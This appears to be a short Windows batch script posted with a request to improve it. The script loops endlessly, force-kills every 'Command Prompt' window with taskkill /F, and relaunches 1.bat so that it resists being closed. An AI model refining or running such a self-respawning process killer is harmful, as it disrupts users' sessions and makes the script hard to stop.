::Refine this and make it better.
@ECHO OFF
SET n=0
:next
SET /a n+=1
TITLE %n%
::You need to make it so it doesn't just check the last one (below)
FOR /F "tokens=* USEBACKQ" %%F IN (`tasklist /FI "WINDOWTITLE eq ^%n^%" ^| find/c "exe"`) DO (
SET windowcount=%%F
)
taskkill /F /FI "WINDOWTITLE eq Command Prompt"
IF "%windowcount%"=="1" (
START 1.bat
)
GOTO :next
